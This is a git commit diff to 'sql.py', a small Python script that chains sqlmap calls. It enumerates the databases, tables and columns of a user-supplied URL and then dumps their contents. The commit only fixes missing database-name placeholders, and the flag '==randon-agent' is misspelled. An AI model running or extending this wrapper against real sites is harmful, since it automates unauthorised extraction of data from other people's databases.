f16e36d436a3f12cf6e937cec852d30ae64c61b7
joker25000 <randjiaa@gmail.com>
2017-04-30 08:18:10 -0400

    Update sql.py

--- sql.py
+++ sql.py
@@ -21,9 +21,9 @@ sqlmap1 = os.system('sqlmap --url  {} --dbs  ==randon-agent'.format (url))
 dbs = input('Enter dbs: ')
 sqlmap2 = os.system('sqlmap --url  {} -D {} --tables  ==randon-agent'.format (url,dbs))
 tap1 = input('Enter tab: ')
-sqlmap3 = os.system('sqlmap --url  {} -D  -T {} --columns  ==randon-agent'.format (url,dbs,tap1))
+sqlmap3 = os.system('sqlmap --url  {} -D {} -T {} --columns  ==randon-agent'.format (url,dbs,tap1))
 colm =input('Enter  colm: ')
-sqlmap4 = os.system('sqlmap --url  {} -D  -T {} -C {} --dump  ==randon-agent'.format (url,dbs,tap1,colm))
+sqlmap4 = os.system('sqlmap --url  {} -D {} -T {} -C {} --dump  ==randon-agent'.format (url,dbs,tap1,colm))
 
 
 
